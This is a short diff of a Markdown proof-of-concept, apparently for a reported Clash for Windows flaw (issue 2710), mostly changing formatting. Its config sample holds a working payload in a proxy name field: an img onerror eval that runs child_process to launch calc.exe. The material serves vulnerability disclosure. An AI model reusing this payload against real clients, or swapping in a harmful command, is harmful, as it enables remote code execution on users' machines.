@@ -49,10 +49,7 @@ type: socks5
 server: 127.0.0.1
 port: "8088"
 skip-cert-verify: true
-```
 proxy-groups:
-```
-
 name: <img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
 type: select
 proxies:
@@ -86,9 +83,9 @@ Proxies
 
 
 
-```
+<div>
 https://github.com/Fndroid/clash_for_windows_pkg/issues/2710 
-```
+</div>
 
 
 
